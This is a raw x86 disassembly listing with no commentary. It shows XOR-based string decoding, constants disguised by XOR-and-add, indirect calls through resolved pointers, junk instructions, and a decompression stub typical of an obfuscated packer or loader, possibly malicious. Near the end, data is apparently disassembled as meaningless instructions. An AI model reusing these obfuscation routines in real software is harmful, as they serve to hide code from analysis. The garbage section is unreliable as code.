  424c4b:	add    edx,eax
  424c4d:	inc    esi
  424c4e:	mov    BYTE PTR [ecx],dl
  424c50:	cmp    esi,0x6
  424c53:	jb     0x424c41
  424c55:	xor    esi,esi
  424c57:	lea    ecx,[ebp+esi*1-0x20]
  424c5b:	movzx  edx,BYTE PTR [ecx]
  424c5e:	xor    edx,0x79
  424c61:	add    edx,eax
  424c63:	inc    esi
  424c64:	mov    BYTE PTR [ecx],dl
  424c66:	cmp    esi,0x7
  424c69:	jb     0x424c57
  424c6b:	xor    esi,esi
  424c6d:	lea    ecx,[ebp+esi*1-0x28]
  424c71:	movzx  edx,BYTE PTR [ecx]
  424c74:	xor    edx,0x79
  424c77:	add    edx,eax
  424c79:	inc    esi
  424c7a:	mov    BYTE PTR [ecx],dl
  424c7c:	cmp    esi,0x8
  424c7f:	jb     0x424c6d
  424c81:	lea    eax,[ebp-0x2c]
  424c84:	mov    DWORD PTR [ebp-0x8],eax
  424c87:	mov    ecx,DWORD PTR [ebp-0x8]
  424c8a:	mov    eax,0x7113fcce
  424c8f:	mov    DWORD PTR [ecx],eax
  424c91:	mov    ecx,DWORD PTR [ebp-0x2c]
  424c94:	push   edi
  424c95:	mov    esi,0x4e3e
  424c9a:	mov    ebx,0x3272ec
  424c9f:	cmp    ecx,eax
  424ca1:	jne    0x424d6c
  424ca7:	lea    eax,[esi+0x29]
  424caa:	mov    WORD PTR [ebp-0x78],ax
  424cae:	mov    eax,esi
  424cb0:	mov    WORD PTR [ebp-0x76],ax
  424cb4:	add    eax,0x3b
  424cb7:	mov    WORD PTR [ebp-0x74],ax
  424cbb:	lea    eax,[esi-0x6]
  424cbe:	mov    WORD PTR [ebp-0x72],ax
  424cc2:	add    eax,0x47
  424cc5:	mov    ecx,eax
  424cc7:	lea    eax,[esi-0x1d]
  424cca:	mov    WORD PTR [ebp-0x66],ax
  424cce:	mov    eax,esi
  424cd0:	mov    WORD PTR [ebp-0x64],ax
  424cd4:	add    eax,0xffffffe4
  424cd7:	mov    WORD PTR [ebp-0x62],ax
  424cdb:	mov    eax,0x44b
  424ce0:	mov    WORD PTR [ebp-0x60],ax
  424ce4:	mov    eax,0x5664
  424ce9:	mov    WORD PTR [ebp-0x5e],ax
  424ced:	mov    eax,0x6104
  424cf2:	mov    WORD PTR [ebp-0x5c],ax
  424cf6:	lea    eax,[ebp-0xe0]
  424cfc:	push   eax
  424cfd:	mov    eax,DWORD PTR [ebp+0xc]
  424d00:	mov    edi,0x75108a4
  424d05:	xor    eax,edi
  424d07:	add    eax,ebx
  424d09:	push   eax
  424d0a:	mov    WORD PTR [ebp-0x70],cx
  424d0e:	lea    ecx,[esi-0x1a]
  424d11:	mov    edx,ecx
  424d13:	lea    eax,[ebp-0x78]
  424d16:	push   eax
  424d17:	mov    eax,DWORD PTR [ebp-0x4]
  424d1a:	mov    eax,DWORD PTR [eax+0x198]
  424d20:	mov    WORD PTR [ebp-0x6e],dx
  424d24:	mov    edx,0x4f82
  424d29:	mov    WORD PTR [ebp-0x6c],dx
  424d2d:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e25
  424d34:	mov    DWORD PTR [ebp-0x5a],0x4e24f116
  424d3b:	mov    DWORD PTR [ebp-0xe0],0x1
  424d45:	mov    DWORD PTR [ebp-0xdc],0x255
  424d4f:	push   DWORD PTR [eax]
  424d51:	mov    eax,DWORD PTR [ebp+0x10]
  424d54:	call   eax
  424d56:	mov    DWORD PTR [ebp-0x8],eax
  424d59:	mov    eax,DWORD PTR [ebp-0x8]
  424d5c:	test   eax,eax
  424d5e:	je     0x424d71
  424d60:	xor    DWORD PTR ds:0x76586876,0x87687666
  424d6a:	jmp    0x424d71
  424d6c:	mov    edi,0x75108a4
  424d71:	mov    eax,DWORD PTR [ebp-0x4]
  424d74:	mov    ecx,DWORD PTR [eax+0x18c]
  424d7a:	xor    eax,eax
  424d7c:	cmp    DWORD PTR [ecx],eax
  424d7e:	jne    0x424fed
  424d84:	mov    ecx,DWORD PTR [ebp-0x4]
  424d87:	mov    ecx,DWORD PTR [ecx+0x17c]
  424d8d:	mov    DWORD PTR [ecx],eax
  424d8f:	mov    ecx,DWORD PTR [ebp-0x4]
  424d92:	mov    ecx,DWORD PTR [ecx+0x180]
  424d98:	mov    DWORD PTR [ecx],eax
  424d9a:	mov    eax,0x4e69
  424d9f:	mov    WORD PTR [ebp-0x9c],ax
  424da6:	mov    eax,esi
  424da8:	mov    WORD PTR [ebp-0x9a],ax
  424daf:	mov    eax,0x4e79
  424db4:	mov    WORD PTR [ebp-0x98],ax
  424dbb:	add    eax,0xffffffc0
  424dbe:	mov    WORD PTR [ebp-0x96],ax
  424dc5:	mov    eax,0x4f8e
  424dca:	mov    WORD PTR [ebp-0x94],ax
  424dd1:	mov    eax,0x4e3a
  424dd6:	mov    WORD PTR [ebp-0x92],ax
  424ddd:	add    eax,0x45
  424de0:	mov    WORD PTR [ebp-0x90],ax
  424de7:	mov    eax,0x4e24
  424dec:	mov    WORD PTR [ebp-0x8e],ax
  424df3:	mov    eax,esi
  424df5:	mov    WORD PTR [ebp-0x8c],ax
  424dfc:	mov    eax,0x4e25
  424e01:	mov    WORD PTR [ebp-0x8a],ax
  424e08:	mov    eax,0x99f9
  424e0d:	mov    WORD PTR [ebp-0x88],ax
  424e14:	mov    eax,0x8d6a
  424e19:	mov    WORD PTR [ebp-0x86],ax
  424e20:	mov    eax,0xd66f
  424e25:	mov    WORD PTR [ebp-0x84],ax
  424e2c:	mov    eax,0xd78b
  424e31:	mov    WORD PTR [ebp-0x82],ax
  424e38:	mov    eax,0x27b4
  424e3d:	mov    WORD PTR [ebp-0x80],ax
  424e41:	mov    eax,0x47b4
  424e46:	mov    WORD PTR [ebp-0x7e],ax
  424e4a:	mov    eax,0x4e3b
  424e4f:	push   0x8
  424e51:	mov    WORD PTR [ebp-0x7c],ax
  424e55:	mov    DWORD PTR [ebp-0x10],0x316120f
  424e5c:	mov    DWORD PTR [ebp-0xc],0x7a150a1d
  424e63:	lea    eax,[ebp-0x10]
  424e66:	pop    ecx
  424e67:	mov    dl,BYTE PTR [eax]
  424e69:	xor    dl,0x79
  424e6c:	sub    dl,0x3
  424e6f:	mov    BYTE PTR [eax],dl
  424e71:	inc    eax
  424e72:	dec    ecx
  424e73:	jne    0x424e67
  424e75:	lea    eax,[ebp-0x10]
  424e78:	mov    DWORD PTR [ebp-0xdc],eax
  424e7e:	lea    eax,[ebp-0xe0]
  424e84:	push   eax
  424e85:	mov    eax,DWORD PTR [ebp+0xc]
  424e88:	xor    eax,edi
  424e8a:	add    eax,ebx
  424e8c:	push   eax
  424e8d:	mov    eax,DWORD PTR [ebp-0x4]
  424e90:	add    eax,0x66
  424e93:	push   eax
  424e94:	mov    eax,DWORD PTR [ebp-0x4]
  424e97:	mov    eax,DWORD PTR [eax+0x198]
  424e9d:	mov    DWORD PTR [ebp-0xe0],0x1
  424ea7:	push   DWORD PTR [eax]
  424ea9:	mov    eax,DWORD PTR [ebp+0x10]
  424eac:	call   eax
  424eae:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb1:	xor    ecx,edi
  424eb3:	add    ecx,ebx
  424eb5:	mov    DWORD PTR [ebp-0x8],eax
  424eb8:	cmp    eax,ecx
  424eba:	jne    0x424ed5
  424ebc:	mov    eax,ds:0x33730bcf
  424ec1:	or     eax,0x22150bce
  424ec6:	mov    ds:0x33730bcf,eax
  424ecb:	add    eax,0x3372e92e
  424ed0:	mov    ds:0x33730bcf,eax
  424ed5:	mov    ecx,0x4f96
  424eda:	mov    eax,ecx
  424edc:	mov    WORD PTR [ebp-0x40],ax
  424ee0:	mov    eax,0x4e63
  424ee5:	mov    edx,eax
  424ee7:	mov    WORD PTR [ebp-0x3e],dx
  424eeb:	lea    edx,[ecx+0x5]
  424eee:	mov    WORD PTR [ebp-0x3c],dx
  424ef2:	add    edx,0xffffffe8
  424ef5:	mov    WORD PTR [ebp-0x3a],dx
  424ef9:	lea    edx,[ecx-0x9]
  424efc:	mov    WORD PTR [ebp-0x38],dx
  424f00:	add    edx,0xfffffffb
  424f03:	mov    WORD PTR [ebp-0x36],dx
  424f07:	lea    edx,[ecx+0x21]
  424f0a:	mov    WORD PTR [ebp-0x34],dx
  424f0e:	mov    WORD PTR [ebp-0x32],cx
  424f12:	mov    ecx,esi
  424f14:	mov    WORD PTR [ebp-0x30],cx
  424f18:	lea    ecx,[edx-0x1]
  424f1b:	mov    edx,ecx
  424f1d:	mov    WORD PTR [ebp-0x54],dx
  424f21:	mov    edx,eax
  424f23:	mov    WORD PTR [ebp-0x52],dx
  424f27:	add    edx,0x18
  424f2a:	mov    WORD PTR [ebp-0x50],dx
  424f2e:	mov    WORD PTR [ebp-0x4e],ax
  424f32:	add    eax,0xa
  424f35:	mov    WORD PTR [ebp-0x4c],ax
  424f39:	mov    eax,0x4e68
  424f3e:	mov    WORD PTR [ebp-0x4a],ax
  424f42:	lea    eax,[ecx-0x1f]
  424f45:	mov    WORD PTR [ebp-0x48],ax
  424f49:	mov    WORD PTR [ebp-0x46],cx
  424f4d:	mov    WORD PTR [ebp-0x44],si
  424f51:	mov    eax,DWORD PTR [ebp+0x8]
  424f54:	movzx  ecx,WORD PTR [ebp-0x54]
  424f58:	xor    eax,edi
  424f5a:	add    eax,ebx
  424f5c:	xor    eax,ecx
  424f5e:	mov    WORD PTR [ebp-0x54],ax
  424f62:	mov    eax,DWORD PTR [ebp+0x8]
  424f65:	movzx  ecx,WORD PTR [ebp-0x40]
  424f69:	xor    eax,edi
  424f6b:	add    eax,ebx
  424f6d:	xor    eax,ecx
  424f6f:	mov    WORD PTR [ebp-0x40],ax
  424f73:	xor    eax,eax
  424f75:	mov    WORD PTR [ebp-0xf4],ax
  424f7c:	mov    WORD PTR [ebp-0x108],ax
  424f83:	mov    edi,DWORD PTR [ebp+0x24]
  424f86:	lea    eax,[ebp-0xf4]
  424f8c:	lea    edx,[ebp-0x54]
  424f8f:	mov    DWORD PTR [ebp-0xe0],0x2
  424f99:	mov    DWORD PTR [ebp-0xdc],eax
  424f9f:	call   0x4279b5
  424fa4:	mov    DWORD PTR [ebp-0xd8],eax
  424faa:	lea    eax,[ebp-0xe0]
  424fb0:	push   eax
  424fb1:	mov    eax,DWORD PTR [ebp+0xc]
  424fb4:	xor    eax,0x75108a4
  424fb9:	add    eax,ebx
  424fbb:	push   eax
  424fbc:	lea    eax,[ebp-0x9c]
  424fc2:	push   eax
  424fc3:	push   DWORD PTR [ebp-0x8]
  424fc6:	mov    eax,DWORD PTR [ebp+0x10]
  424fc9:	call   eax
  424fcb:	mov    edi,DWORD PTR [ebp+0x24]
  424fce:	lea    eax,[ebp-0x108]
  424fd4:	lea    edx,[ebp-0x40]
  424fd7:	mov    DWORD PTR [ebp-0xdc],eax
  424fdd:	call   0x4279b5
  424fe2:	mov    DWORD PTR [ebp-0xd8],eax
  424fe8:	mov    edi,0x75108a4
  424fed:	mov    eax,DWORD PTR [ebp+0x14]
  424ff0:	push   DWORD PTR [ebp-0x4]
  424ff3:	push   DWORD PTR [ebp+0x20]
  424ff6:	push   DWORD PTR [ebp+0x1c]
  424ff9:	push   DWORD PTR [ebp+0x18]
  424ffc:	push   DWORD PTR [ebp+0x10]
  424fff:	push   DWORD PTR [ebp+0x8]
  425002:	push   DWORD PTR [ebp+0xc]
  425005:	call   0x426252
  42500a:	test   eax,eax
  42500c:	je     0x425050
  42500e:	add    DWORD PTR [ebp-0x4],eax
  425011:	push   DWORD PTR [ebp-0x4]
  425014:	lea    esi,[ebp+0x4]
  425017:	call   0x425440
  42501c:	mov    eax,DWORD PTR [ebp-0x4]
  42501f:	mov    eax,DWORD PTR [eax+0x1c8]
  425025:	mov    eax,DWORD PTR [eax]
  425027:	xor    eax,edi
  425029:	add    eax,ebx
  42502b:	mov    eax,DWORD PTR [ebp-0x4]
  42502e:	jne    0x425046
  425030:	mov    ecx,DWORD PTR [ebp-0x4]
  425033:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425039:	push   DWORD PTR [ecx]
  42503b:	mov    eax,DWORD PTR [eax+0x1d8]
  425041:	call   DWORD PTR [eax+0x28]
  425044:	jmp    0x425050
  425046:	mov    eax,DWORD PTR [eax+0x17c]
  42504c:	mov    eax,DWORD PTR [eax]
  42504e:	add    DWORD PTR [esi],eax
  425050:	pop    edi
  425051:	pop    esi
  425052:	pop    ebx
  425053:	leave  
  425054:	ret    0x20
  425057:	push   edi
  425058:	push   esi
  425059:	push   ebx
  42505a:	push   ebp
  42505b:	mov    ebp,esp
  42505d:	mov    eax,DWORD PTR [ebp+0x24]
  425060:	add    DWORD PTR [ebp+0x28],eax
  425063:	push   eax
  425064:	cld    
  425065:	mov    esi,DWORD PTR [ebp+0x18]
  425068:	add    DWORD PTR [ebp+0x1c],esi
  42506b:	push   esi
  42506c:	mov    esi,DWORD PTR [ebp+0x14]
  42506f:	lods   eax,DWORD PTR ds:[esi]
  425070:	xchg   edx,eax
  425071:	push   edx
  425072:	mov    cl,BYTE PTR [esi-0x2]
  425075:	or     eax,0xffffffff
  425078:	shl    eax,cl
  42507a:	not    eax
  42507c:	push   eax
  42507d:	mov    cl,dh
  42507f:	or     eax,0xffffffff
  425082:	shl    eax,cl
  425084:	not    eax
  425086:	push   eax
  425087:	add    cl,dl
  425089:	mov    edi,esi
  42508b:	sub    esp,0xc
  42508e:	sub    eax,eax
  425090:	inc    eax
  425091:	push   eax
  425092:	push   eax
  425093:	push   eax
  425094:	push   eax
  425095:	push   eax
  425096:	push   edi
  425097:	sub    esi,esi
  425099:	push   esi
  42509a:	or     ebx,0xffffffff
  42509d:	mov    eax,0x300
  4250a2:	shl    eax,cl
  4250a4:	lea    ecx,[eax+0x736]
  4250aa:	mov    eax,0x4000400
  4250af:	shr    ecx,1
  4250b1:	rep stos DWORD PTR es:[edi],eax
  4250b3:	push   0x5
  4250b5:	pop    ecx
  4250b6:	call   0x4253a1
  4250bb:	loop   0x4250b6
  4250bd:	lea    esi,[esi]
  4250bf:	lea    edi,[edi]
  4250c1:	mov    edi,DWORD PTR [ebp-0x4]
  4250c4:	mov    eax,DWORD PTR [ebp-0x10]
  4250c7:	sub    edi,DWORD PTR [ebp+0x24]
  4250ca:	and    eax,edi
  4250cc:	mov    DWORD PTR [ebp-0x18],eax
  4250cf:	mov    al,0x0
  4250d1:	call   0x4253b9
  4250d6:	jne    0x425171
  4250dc:	mov    cl,BYTE PTR [ebp-0xc]
  4250df:	and    edi,DWORD PTR [ebp-0x14]
  4250e2:	shl    edi,cl
  4250e4:	sub    cl,0x8
  4250e7:	neg    cl
  4250e9:	shr    esi,cl
  4250eb:	pop    eax
  4250ec:	add    edi,esi
  4250ee:	pop    esi
  4250ef:	lea    edi,[edi+edi*2]
  4250f2:	shl    edi,0x8
  4250f5:	cmp    al,0x7
  4250f7:	pop    edx
  4250f8:	lea    ecx,[esi+edi*2+0xe6c]
  4250ff:	push   ecx
  425100:	push   esi
  425101:	mov    esi,0x100
  425106:	push   eax
  425107:	mov    al,0x1
  425109:	jb     0x42513f
  42510b:	mov    edi,DWORD PTR [ebp-0x4]
  42510e:	sub    edi,DWORD PTR [ebp-0x24]
  425111:	movzx  edi,BYTE PTR [edi]
  425114:	mov    ebp,DWORD PTR [ebp-0x34]
  425117:	shl    edi,1
  425119:	mov    ecx,esi
  42511b:	and    esi,edi
  42511d:	add    ecx,esi
  42511f:	lea    ebp,[ebp+ecx*2+0x0]
  425123:	call   0x4253d8
  425128:	mov    ecx,eax
  42512a:	shr    esi,0x8
  42512d:	and    ecx,0x1
  425130:	cmp    esi,ecx
  425132:	mov    esi,0x100
  425137:	jne    0x425147
  425139:	cmp    eax,esi
  42513b:	jb     0x425114
  42513d:	jmp    0x425153
  42513f:	mov    ebp,DWORD PTR [ebp-0x34]
  425142:	call   0x4253d8
  425147:	inc    eax
  425148:	inc    esi
  425149:	sub    eax,0x1
  42514c:	sub    esi,0x1
  42514f:	cmp    eax,esi
  425151:	jb     0x42513f
  425153:	pop    edx
  425154:	inc    edx
  425155:	cmp    edx,0x5
  425158:	dec    edx
  425159:	mov    ecx,edx
  42515b:	jb     0x42516c
  42515d:	inc    edx
  42515e:	cmp    edx,0xb
  425161:	dec    edx
  425162:	mov    cl,0x4
  425164:	dec    cl
  425166:	jb     0x42516c
  425168:	mov    cl,0x7
  42516a:	dec    cl
  42516c:	sub    edx,ecx
  42516e:	push   edx
  42516f:	jmp    0x4251c0
  425171:	mov    al,0xc1
  425173:	dec    al
  425175:	call   0x4253c9
  42517a:	jne    0x425190
  42517c:	pop    eax
  42517d:	pop    edi
  42517e:	pop    edx
  42517f:	pop    ecx
  425180:	pop    edx
  425181:	pop    ecx
  425182:	push   DWORD PTR [esp]
  425185:	push   ecx
  425186:	push   edx
  425187:	mov    edx,0x664
  42518c:	mov    cl,0x0
  42518e:	jmp    0x425203
  425190:	mov    al,0xcd
  425192:	dec    al
  425194:	call   0x4253c9
  425199:	jne    0x4251c9
  42519b:	mov    al,0xf1
  42519d:	dec    al
  42519f:	call   0x4253b9
  4251a4:	jne    0x4251f9
  4251a6:	pop    eax
  4251a7:	cmp    al,0x7
  4251a9:	mov    al,0x9
  4251ab:	jb     0x4251af
  4251ad:	mov    al,0xb
  4251af:	push   eax
  4251b0:	mov    esi,DWORD PTR [ebp-0x4]
  4251b3:	sub    esi,DWORD PTR [ebp-0x24]
  4251b6:	cmp    esi,DWORD PTR [ebp+0x24]
  4251b9:	jb     0x425390
  4251bf:	lods   al,BYTE PTR ds:[esi]
  4251c0:	mov    edi,DWORD PTR [ebp-0x4]
  4251c3:	stos   BYTE PTR es:[edi],al
  4251c4:	jmp    0x425357
  4251c9:	mov    al,0xd8
  4251cb:	call   0x4253c9
  4251d0:	mov    esi,DWORD PTR [ebp-0x28]
  4251d3:	je     0x4251f0
  4251d5:	mov    al,0xe4
  4251d7:	call   0x4253c9
  4251dc:	mov    esi,DWORD PTR [ebp-0x2c]
  4251df:	je     0x4251ea
  4251e1:	mov    esi,DWORD PTR [ebp-0x30]
  4251e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251e7:	mov    DWORD PTR [ebp-0x30],ecx
  4251ea:	mov    ecx,DWORD PTR [ebp-0x28]
  4251ed:	mov    DWORD PTR [ebp-0x2c],ecx
  4251f0:	mov    ecx,DWORD PTR [ebp-0x24]
  4251f3:	mov    DWORD PTR [ebp-0x28],ecx
  4251f6:	mov    DWORD PTR [ebp-0x24],esi
  4251f9:	pop    eax
  4251fa:	pop    edi
  4251fb:	pop    ecx
  4251fc:	mov    edx,0xa68
  425201:	mov    cl,0x8
  425203:	add    edx,edi
  425205:	push   edx
  425206:	push   edi
  425207:	cmp    al,0x7
  425209:	mov    al,cl
  42520b:	jb     0x42520f
  42520d:	add    al,0x3
  42520f:	push   eax
  425210:	mov    ebp,DWORD PTR [ebp-0x34]
  425213:	call   0x4253d6
  425218:	jne    0x42522e
  42521a:	mov    eax,DWORD PTR [ebp-0x18]
  42521d:	mov    edi,DWORD PTR [ebp-0x34]
  425220:	shl    eax,0x3
  425223:	sub    ecx,ecx
  425225:	push   0x8
  425227:	pop    esi
  425228:	lea    edi,[edi+eax*2+0x4]
  42522c:	jmp    0x425263
  42522e:	mov    ebp,DWORD PTR [ebp-0x34]
  425231:	add    ebp,0x2
  425234:	call   0x4253d6
  425239:	jne    0x425253
  42523b:	mov    eax,DWORD PTR [ebp-0x18]
  42523e:	mov    edi,DWORD PTR [ebp-0x34]
  425241:	shl    eax,0x3
  425244:	push   0x8
  425246:	pop    ecx
  425247:	push   0x8
  425249:	pop    esi
  42524a:	lea    edi,[edi+eax*2+0x104]
  425251:	jmp    0x425263
  425253:	mov    edi,0x204
  425258:	add    edi,DWORD PTR [ebp-0x34]
  42525b:	push   0x10
  42525d:	pop    ecx
  42525e:	mov    esi,0x100
  425263:	mov    DWORD PTR [ebp-0x1c],ecx
  425266:	sub    eax,eax
  425268:	inc    eax
  425269:	mov    ebp,edi
  42526b:	call   0x4253d8
  425270:	mov    ecx,eax
  425272:	sub    ecx,esi
  425274:	jb     0x425269
  425276:	add    DWORD PTR [ebp-0x1c],ecx
  425279:	cmp    DWORD PTR [ebp-0x3c],0x4
  42527d:	jae    0x425333
  425283:	add    DWORD PTR [ebp-0x3c],0x7
  425287:	mov    ecx,DWORD PTR [ebp-0x1c]
  42528a:	cmp    ecx,0x4
  42528d:	jb     0x425292
  42528f:	push   0x3
  425291:	pop    ecx
  425292:	mov    edi,DWORD PTR [ebp-0x38]
  425295:	shl    ecx,0x6
  425298:	sub    eax,eax
  42529a:	inc    eax
  42529b:	push   0x40
  42529d:	pop    esi
  42529e:	lea    edi,[edi+ecx*2+0x360]
  4252a5:	mov    ebp,edi
  4252a7:	call   0x4253d8
  4252ac:	mov    ecx,eax
  4252ae:	sub    ecx,esi
  4252b0:	jb     0x4252a5
  4252b2:	mov    DWORD PTR [ebp-0x18],ecx
  4252b5:	mov    DWORD PTR [ebp-0x24],ecx
  4252b8:	cmp    ecx,0x4
  4252bb:	jb     0x425330
  4252bd:	mov    esi,ecx
  4252bf:	and    DWORD PTR [ebp-0x24],0x1
  4252c3:	shr    esi,1
  4252c5:	or     DWORD PTR [ebp-0x24],0x2
  4252c9:	dec    esi
  4252ca:	cmp    ecx,0xe
  4252cd:	jae    0x4252e8
  4252cf:	mov    eax,0x2af
  4252d4:	sub    eax,ecx
  4252d6:	mov    ecx,esi
  4252d8:	shl    BYTE PTR [ebp-0x24],cl
  4252db:	add    eax,DWORD PTR [ebp-0x24]
  4252de:	shl    eax,1
  4252e0:	add    eax,DWORD PTR [ebp-0x38]
  4252e3:	mov    DWORD PTR [ebp-0x34],eax
  4252e6:	jmp    0x425315
  4252e8:	sub    esi,0x4
  4252eb:	call   0x425395
  4252f0:	shr    ebx,1
  4252f2:	shl    DWORD PTR [ebp-0x24],1
  4252f5:	cmp    DWORD PTR [ebp-0x20],ebx
  4252f8:	jb     0x425300
  4252fa:	inc    DWORD PTR [ebp-0x24]
  4252fd:	sub    DWORD PTR [ebp-0x20],ebx
  425300:	dec    esi
  425301:	jne    0x4252eb
  425303:	mov    eax,0x644
  425308:	add    eax,DWORD PTR [ebp-0x38]
  42530b:	mov    DWORD PTR [ebp-0x34],eax
  42530e:	shl    DWORD PTR [ebp-0x24],0x4
  425312:	push   0x4
  425314:	pop    esi
  425315:	sub    edi,edi
  425317:	inc    edi
  425318:	mov    eax,edi
  42531a:	mov    ebp,DWORD PTR [ebp-0x34]
  42531d:	call   0x4253d8
  425322:	test   al,0x1
  425324:	je     0x425329
  425326:	or     DWORD PTR [ebp-0x24],edi
  425329:	shl    edi,1
  42532b:	dec    esi
  42532c:	jne    0x42531a
  42532e:	jmp    0x425330
  425330:	inc    DWORD PTR [ebp-0x24]
  425333:	mov    ecx,DWORD PTR [ebp-0x1c]
  425336:	add    ecx,0x2
  425339:	mov    edi,DWORD PTR [ebp-0x4]
  42533c:	mov    eax,edi
  42533e:	sub    eax,DWORD PTR [ebp+0x24]
  425341:	cmp    DWORD PTR [ebp-0x24],eax
  425344:	ja     0x425390
  425346:	mov    esi,edi
  425348:	sub    esi,DWORD PTR [ebp-0x24]
  42534b:	mov    edx,DWORD PTR [ebp+0x28]
  42534e:	lods   al,BYTE PTR ds:[esi]
  42534f:	stos   BYTE PTR es:[edi],al
  425350:	cmp    edi,edx
  425352:	jae    0x425357
  425354:	dec    ecx
  425355:	jne    0x42534e
  425357:	mov    DWORD PTR [ebp-0x4],edi
  42535a:	movzx  esi,al
  42535d:	cmp    edi,DWORD PTR [ebp+0x28]
  425360:	jb     0x4250c1
  425366:	call   0x425395
  42536b:	sub    eax,eax
  42536d:	lea    ebp,[esp+0x3c]
  425371:	mov    edx,DWORD PTR [ebp+0x20]
  425374:	mov    esi,DWORD PTR [ebp-0x8]
  425377:	sub    esi,DWORD PTR [ebp+0x18]
  42537a:	mov    DWORD PTR [edx],esi
  42537c:	mov    edx,DWORD PTR [ebp+0x2c]
  42537f:	mov    edi,DWORD PTR [ebp-0x4]
  425382:	sub    edi,DWORD PTR [ebp+0x24]
  425385:	mov    DWORD PTR [edx],edi
  425387:	leave  
  425388:	pop    ebx
  425389:	pop    esi
  42538a:	pop    edi
  42538b:	ret    0x1c
  42538e:	pop    esi
  42538f:	pop    eax
  425390:	sub    eax,eax
  425392:	inc    eax
  425393:	jmp    0x42536d
  425395:	cmp    ebx,0x1000000
  42539b:	jb     0x42539e
  42539d:	ret    
  42539e:	shl    ebx,0x8
  4253a1:	push   esi
  4253a2:	mov    esi,DWORD PTR [ebp-0x8]
  4253a5:	cmp    esi,DWORD PTR [ebp+0x1c]
  4253a8:	jae    0x42538e
  4253aa:	mov    eax,DWORD PTR [ebp-0x20]
  4253ad:	shl    eax,0x8
  4253b0:	lods   al,BYTE PTR ds:[esi]
  4253b1:	mov    DWORD PTR [ebp-0x20],eax
  4253b4:	mov    DWORD PTR [ebp+0x74],esi
  4253b7:	aas    
  4253b8:	or     bl,BYTE PTR [edx-0xf5ef3e3]
  4253be:	add    al,0x6
  4253c0:	inc    esi
  4253c1:	mov    ecx,DWORD PTR [ecx+0x689540d]
  4253c7:	pop    edx
  4253c8:	(bad)  
  4253c9:	mov    eax,ds:0xd8904f0
  4253ce:	or     al,0x9a
  4253d0:	pop    ebp
  4253d1:	adc    al,0x9e
  4253d3:	pop    ebx
  4253d4:	or     eax,0x9e04d983
  4253d9:	pop    ebx
  4253da:	or     eax,0x837a8683
  4253df:	add    DWORD PTR [ebx-0x6544967b],0x1b
  4253e6:	retf   
  4253e7:	repz push es
  4253e9:	dec    ebx
  4253ea:	retf   
  4253eb:	ret    
  4253ec:	xchg   ebx,eax
  4253ed:	stc    
  4253ee:	sbb    ecx,ebx
  4253f0:	cmp    ebp,DWORD PTR [ecx-0x44]
  4253f3:	cwde   
  4253f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253f5:	or     BYTE PTR [ebx],0xcb
  4253f8:	repz push es
  4253fa:	dec    edx
  4253fb:	xchg   ebx,eax
  4253fc:	xchg   esp,eax
  4253fd:	sub    ecx,ebx
  4253ff:	ret    
  425400:	call   0x683:0x2df2a11a
  425407:	push   esi
  425408:	cdq    
  425409:	mov    eax,ds:0x1bf518e2
  42540e:	retf   
  42540f:	ret    
  425410:	imul   esi,DWORD PTR [ecx-0x7c09c966],0xd9838393
  42541a:	sbb    BYTE PTR [esi],al
  42541c:	push   esi
  42541d:	lea    ecx,[edi-0x7b]
  425420:	sbb    eax,0x9e048983
  425425:	pop    ebx
  425426:	retf   
  425427:	add    ecx,DWORD PTR [edx]
  425429:	push   es
  42542a:	pop    eax
  42542b:	(bad)  
  42542c:	aad    0x1b
  42542e:	retf   
  42542f:	ret    
  425430:	fnstenv [esi]
  425432:	dec    edi
  425433:	aad    0x2d
  425435:	add    DWORD PTR [ebx],0xffffffc0
  425438:	add    eax,0x1
  42543b:	lea    ebp,[esp+0x40]
  42543f:	ret    
  425440:	push   ebp
  425441:	mov    ebp,esp
  425443:	sub    esp,0x12c
  425449:	push   ebx
  42544a:	push   esi
  42544b:	push   edi
  42544c:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  425453:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  42545a:	mov    eax,DWORD PTR [ebp+0x8]
  42545d:	mov    DWORD PTR [ebp+0x8],eax
  425460:	mov    ecx,DWORD PTR [ebp-0x10]
  425463:	mov    ebx,0x75108a4
  425468:	xor    ecx,ebx
  42546a:	mov    eax,0x3272ec
  42546f:	add    ecx,eax
  425471:	mov    DWORD PTR [ebp-0x2c],ecx
  425474:	mov    ecx,DWORD PTR [ebp-0x10]
  425477:	xor    ecx,ebx
  425479:	add    ecx,eax
  42547b:	mov    DWORD PTR [ebp-0x3c],ecx
  42547e:	mov    ecx,DWORD PTR [ebp-0x10]
  425481:	xor    ecx,ebx
  425483:	add    ecx,eax
  425485:	mov    DWORD PTR [ebp-0x40],ecx
  425488:	mov    ecx,DWORD PTR [ebp-0x10]
  42548b:	xor    ecx,ebx
  42548d:	add    ecx,eax
  42548f:	mov    DWORD PTR [ebp-0xd8],ecx
  425495:	mov    DWORD PTR [ebp-0x50],0xf89f05b0
  42549c:	mov    DWORD PTR [ebp-0x40],0xf89cb5b0
  4254a3:	mov    DWORD PTR [ebp-0x54],0xf89c85bc
  4254aa:	push   0x25
  4254ac:	pop    ecx
  4254ad:	mov    DWORD PTR [ebp-0x38],ecx
  4254b0:	mov    DWORD PTR [ebp-0x38],ecx
  4254b3:	push   0x65
  4254b5:	pop    ecx
  4254b6:	mov    DWORD PTR [ebp-0x38],ecx
  4254b9:	mov    DWORD PTR [ebp-0x38],ecx
  4254bc:	mov    DWORD PTR [ebp-0x38],0x4d
  4254c3:	mov    DWORD PTR [ebp-0x38],0x43
  4254ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4254cd:	xor    ecx,ebx
  4254cf:	add    ecx,eax
  4254d1:	mov    DWORD PTR [ebp-0x38],ecx
  4254d4:	mov    ecx,DWORD PTR [ebp-0x10]
  4254d7:	xor    ecx,ebx
  4254d9:	add    ecx,eax
  4254db:	mov    DWORD PTR [ebp-0x38],ecx
  4254de:	mov    DWORD PTR [ebp-0x28],0x258
  4254e5:	mov    DWORD PTR [ebp-0x20],0x36
  4254ec:	mov    DWORD PTR [ebp-0x14],0x7a
  4254f3:	lea    edi,[ebp-0x10c]
  4254f9:	lea    esi,[ebp-0x12c]
  4254ff:	call   0x4261c1
  425504:	dec    DWORD PTR [ebp-0x14]
  425507:	jne    0x4254f3
  425509:	dec    DWORD PTR [ebp-0x20]
  42550c:	jne    0x4254ec
